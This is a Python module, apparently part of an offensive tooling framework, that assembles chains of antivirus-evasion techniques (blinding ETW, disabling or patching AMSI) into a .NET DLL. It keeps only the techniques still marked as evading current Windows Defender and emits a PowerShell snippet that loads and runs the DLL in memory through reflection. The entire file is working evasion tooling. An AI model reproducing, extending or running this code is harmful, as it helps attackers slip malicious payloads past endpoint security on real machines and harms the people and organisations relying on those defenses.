@dataclass
class Chain:
    """A compiled evasion chain."""
    name: str
    techniques: list[str]
    payload: object

    @property
    def bytes(self) -> bytes:
        return self.payload.built_bytes

    @property
    def class_name(self) -> str:
        return "EvadeChain.Chain"

    @property
    def method_name(self) -> str:
        return "Execute"


def resolve_chain(name_or_list, only_working: bool = False) -> list[str]:
    """Resolve a chain name or list to a technique list.

    only_working=True removes any technique whose status is not
    "works". Useful when compiling for a Defender-enabled target.
    """
    if isinstance(name_or_list, list):
        names = list(name_or_list)
    elif isinstance(name_or_list, str) and "," in name_or_list:
        names = [n.strip() for n in name_or_list.split(",") if n.strip()]
    elif isinstance(name_or_list, str) and name_or_list in CHAIN_PRESETS:
        names = list(CHAIN_PRESETS[name_or_list])
    else:
        names = [name_or_list]

    # Validate
    for n in names:
        if n not in av_bypass.TECHNIQUES:
            raise ValueError(
                f"unknown technique in chain: {n!r}; "
                f"available: {', '.join(sorted(av_bypass.TECHNIQUES))}")

    if only_working:
        filtered = [n for n in names
                    if av_bypass.TECHNIQUES[n].get("status") == "works"]
        removed = [n for n in names if n not in filtered]
        if removed:
            warn(f"  removed non-working techniques: "
                 f"{', '.join(removed)}")
        names = filtered

    # Warn if a chain contains a technique marked "caught" or
    # "broken" and we're not explicitly filtering
    if not only_working:
        unsafe = [n for n in names
                  if av_bypass.TECHNIQUES[n].get("status")
                  in ("caught", "broken")]
        if unsafe:
            warn(f"  chain contains unsafely-marked techniques: "
                 f"{', '.join(unsafe)}; expected to be detected by "
                 f"current Defender")

    return names


def compile_chain(name_or_list, chain_name: str | None = None,
                  only_working: bool = False,
                  verbose: bool = False) -> Chain:
    """Compile a chain into a single assembly."""
    names = resolve_chain(name_or_list, only_working=only_working)

    if not names:
        raise ValueError("empty chain")

    techniques = []
    for n in names:
        spec = av_bypass.TECHNIQUES[n]
        techniques.append((n, spec["source"]))

    chain_source = _build_chain_source(techniques)

    from payload import framework

    if chain_name is None:
        if len(names) == 1:
            chain_name = names[0]
        else:
            chain_name = "_".join(names[:3])[:32]
            if len(names) > 3:
                chain_name += f"_+{len(names)-3}"

    p = framework.Payload(
        language="csharp",
        source=chain_source,
        target="net48",
        extra_files={
            "__output_type": "Library",
            "__assembly_name": "EvadeChain",
            "__namespace": "EvadeChain",
        },
        post_processing=[],
        description=f"evade chain: {','.join(names)}",
    )

    if verbose:
        info(f"  chain: {', '.join(names)} → EvadeChain.dll (net48)")

    p.build(verbose=verbose)
    return Chain(name=chain_name, techniques=names, payload=p)


def loader_ps1(chain: Chain, dll_path: str | None = None) -> str:
    """Return a PowerShell snippet that loads and invokes the chain."""
    if dll_path:
        path_escaped = dll_path.replace("\\", "\\\\")
        read_line = (
            f'$bytes = [IO.File]::ReadAllBytes("{path_escaped}")'
        )
    else:
        read_line = "$bytes = <your bytes here>"

    return (
        f"{read_line}\n"
        f"$asm = [Reflection.Assembly]::Load($bytes)\n"
        f"$asm.GetType(\"{chain.class_name}\")"
        f".GetMethod(\"{chain.method_name}\").Invoke($null, @())\n"
    )


def list_presets(only_modern: bool = False) -> list[dict]:
    """Return preset chain metadata.

    only_modern=True filters to presets that use only techniques
    marked status=works.
    """
    out = []
    for name, techs in CHAIN_PRESETS.items():
        if only_modern and name not in MODERN_PRESETS:
            continue
        out.append({
            "name": name,
            "techniques": techs,
            "description": _describe_chain(techs),
            "modern": name in MODERN_PRESETS,
        })
    return out


def _describe_chain(techs: list[str]) -> str:
    """Human-readable summary of what a chain does."""
    has_etw = "etw_patch" in techs
    has_alloc = "alloc_hglobal" in techs
    has_disable = "reflection_disable" in techs
    has_patch = "reflection_patch" in techs

    parts = []
    if has_etw:
        parts.append("blinds ETW")
    if has_disable:
        parts.append("disables AMSI init")
    if has_alloc:
        parts.append("swaps AMSI context")
    if has_patch:
        parts.append("patches AMSI code (caught)")
    return " → ".join(parts) if parts else "no-op"